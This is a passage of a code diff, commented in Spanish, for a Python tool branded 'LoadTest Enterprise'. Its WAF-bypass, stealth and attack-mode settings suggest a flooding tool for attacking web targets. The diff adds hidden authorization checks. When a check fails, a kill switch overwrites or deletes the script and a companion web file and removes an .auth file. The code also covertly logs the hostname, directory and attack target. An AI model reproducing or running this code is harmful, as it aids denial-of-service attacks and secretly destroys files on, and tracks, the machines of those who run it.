+        _log_usage_location("unknown", str(SCRIPT_DIR), "kill_switch_activated")
+        
+        # Intentar eliminar/desactivar archivos críticos
+        try:
+            script_file = Path(__file__)
+            if script_file.exists():
+                # Crear backup antes de eliminar (opcional)
+                backup_file = script_file.with_suffix('.py.disabled')
+                try:
+                    shutil.copy2(script_file, backup_file)
+                except Exception:
+                    pass
+                
+                # Sobrescribir con código de desactivación (múltiples intentos)
+                disable_code = '''#!/usr/bin/env python3
+# Herramienta desactivada por seguridad
+# Acceso no autorizado detectado
+import sys
+import os
+print("="*60)
+print("ACCESO NO AUTORIZADO")
+print("Esta herramienta ha sido desactivada por seguridad.")
+print("Contacta al administrador para más información.")
+print("="*60)
+sys.exit(1)
+'''
+                # Intentar escribir múltiples veces para asegurar que se guarde
+                for attempt in range(3):
+                    try:
+                        with open(script_file, 'w') as f:
+                            f.write(disable_code)
+                        # Verificar que se escribió correctamente
+                        with open(script_file, 'r') as f:
+                            if 'ACCESO NO AUTORIZADO' in f.read():
+                                break
+                    except Exception:
+                        if attempt == 2:
+                            # Último intento - usar método alternativo
+                            try:
+                                os.remove(script_file)
+                            except Exception:
+                                pass
+                
+                # También intentar desactivar loadtest_web.py
+                web_file = script_file.parent / "loadtest_web.py"
+                if web_file.exists():
+                    try:
+                        with open(web_file, 'w') as f:
+                            f.write(disable_code)
+                    except Exception:
+                        pass
+                
+                # Intentar eliminar archivos de configuración sensibles
+                try:
+                    auth_file = script_file.parent / ".auth"
+                    if auth_file.exists():
+                        auth_file.unlink()
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        
+        # Mostrar mensaje y salir
+        try:
+            print_color("\n" + "="*60, Colors.RED, True)
+            print_color("ACCESO NO AUTORIZADO", Colors.RED, True)
+            print_color("Esta herramienta ha sido desactivada por seguridad.", Colors.RED)
+            print_color("="*60, Colors.RED, True)
+        except Exception:
+            print("\n" + "="*60)
+            print("ACCESO NO AUTORIZADO")
+            print("Esta herramienta ha sido desactivada por seguridad.")
+            print("="*60)
+        
+        sys.exit(1)
+    except Exception:
+        import sys
+        sys.exit(1)
+
 def main():
     """Función principal"""
     global TARGET, DURATION, POWER_LEVEL, MULTIPLIER, ATTACK_MODE, DEBUG_MODE, DRY_RUN
     global MAX_CONNECTIONS, MAX_THREADS, USE_LARGE_PAYLOADS, AUTO_THROTTLE, MEMORY_MONITORING
     global WAF_BYPASS, STEALTH_MODE
+    
+    # Verificación de estado del sistema (integrada en flujo normal)
+    if not _validate_execution():
+        return
     
     parser = argparse.ArgumentParser(
         description="LoadTest Enterprise - Enterprise Web Load Testing & Performance Analysis Suite",
@@ -7071,6 +7884,10 @@ Ejemplos:
     # Verificación automática de actualizaciones (solo si no está desactivada)
     if not args.no_auto_update_check:
         auto_check_updates()
+    
+    # Verificación de autorización adicional (oculta)
+    if not _validate_execution():
+        return
     
     # Banner
     print_color("""
@@ -7176,11 +7993,22 @@ Ejemplos:
     elif not DRY_RUN and WEB_PANEL_MODE:
         log_message("INFO", "Iniciando stress test automáticamente (modo web panel)")
     
+    # Verificación de autorización antes de iniciar ataque (oculta)
+    if not _validate_execution():
+        return
+    
     # Inicializar stats y activar monitoreo
     attack_stats["start_time"] = datetime.now()
     global monitoring_active
     monitoring_active = True
     log_message("INFO", f"Iniciando stress test - Target: {TARGET}, Duración: {DURATION}s, Nivel: {POWER_LEVEL}")
+    
+    # Registrar inicio de ataque
+    try:
+        import socket
+        _log_usage_location(socket.gethostname(), str(SCRIPT_DIR), f"attack_started_{TARGET}")
+    except Exception:
+        pass
     
     # Desplegar ataques según modo
     print_color("\n🚀 Iniciando despliegue de ataques...\n", Colors.GREEN, True)
@@ -7471,6 +8299,17 @@ def show_all_parameters():
     print_color("\n" + "="*80, Colors.CYAN)
 
 def start_web_panel(port: int = 5000):
+    # Verificación de autorización antes de iniciar panel web
+    if not _validate_execution():
+        print_color("Acceso no autorizado. Panel desactivado.", Colors.RED, True)
+        sys.exit(1)
+    
+    # Registrar inicio del panel web
+    try:
+        import socket
+        _log_usage_location(socket.gethostname(), str(SCRIPT_DIR), "web_panel_started")
+    except Exception:
+        pass
     """Inicia el panel web"""
     try:
         # Buscar loadtest_web.py en varios ubicaciones posibles
@@ -7577,5 +8416,11 @@ def start_web_panel(port: int = 5000):
             traceback.print_exc()
 
 if __name__ == "__main__":
+    # Verificación final antes de ejecutar main
+    try:
+        if not _validate_execution():
+            sys.exit(1)
+    except Exception:
+        pass  # Continuar si hay error en verificación
     main()
 
